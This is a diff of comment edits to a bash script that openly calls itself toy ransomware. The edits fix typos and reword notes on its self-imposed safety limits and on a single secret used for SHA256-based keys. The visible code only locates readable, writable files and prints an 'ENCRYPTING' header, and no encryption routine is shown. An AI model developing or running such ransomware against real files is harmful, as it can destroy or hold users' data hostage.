@@ -2,12 +2,12 @@
 
 # Just for funsies ransomware written in bash 
 # Using built-in Linux tools
-# It has three layers to protect you frpm yourself
+# It has three layers to protect you from yourself
 # Don't mess with them!
 
-# 1) Running as root is DISALLOWED - reduce scope of oopsies
-# 2) Search recursion is limited to 1 - reduce depth of oopsies
-# 3) The plaintext files are not deleted. They are moved to .deleted_files
+### 1) Running as root is DISALLOWED - reduces scope of oopsies
+### 2) Search recursion is limited to 1 - reduces depth of oopsies
+### 3) The plaintext files are not deleted. They are moved to .deleted_files
 
 # SANITY AND SAFETY CHECK! 
 # Prevent execution as root
@@ -24,10 +24,10 @@ fi
 # For each candidate file, we ensure:
 # - It exists (-e)
 # - It is readable (-r)
-# - It is writable (-w) # Corrected typo
+# - It is writable (-w) 
 
 check_file() {
-    local file_path="$1" # Use a local variable for the argument for clarity
+    local file_path="$1" 
 
     # Can we see its existence?
     if ! [[ -e "$file_path" ]]; then
@@ -165,7 +165,7 @@ find_files "rx_dir" "exposed_files"
 
 # So far - we found all files via find_files(), which calls check_file()
 # We now loop over that and encryptthe files. We only need to transfer
-# the single secretm the other components (file ownership, path) are less like to change
+# the single secret; the other inputs to SHA256 (file ownership, path) are less like to change
 
 echo "---------ENCRYPTING---------"
 echo ":"
